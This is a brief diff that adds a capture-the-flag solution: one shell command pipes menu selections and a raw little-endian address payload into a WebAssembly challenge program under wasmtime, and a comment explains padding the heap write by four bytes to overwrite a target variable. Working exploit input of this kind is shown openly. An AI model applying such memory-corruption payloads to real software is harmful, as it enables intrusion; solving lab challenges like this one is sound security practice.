@@ -1,0 +1,3 @@
+echo -e "3\n1\n3\n2\n3\n3\n2\n2\n4\n2\n\xdc\x16\x50\x00\x00\n3\n5\n3\n4\n4\n4\n0000fL4g\n1\n4\n" | wasmtime chall.wasm
+
+note: since you can't malloc into the variable itself, malloc to 4 bytes before and pad payload by 4
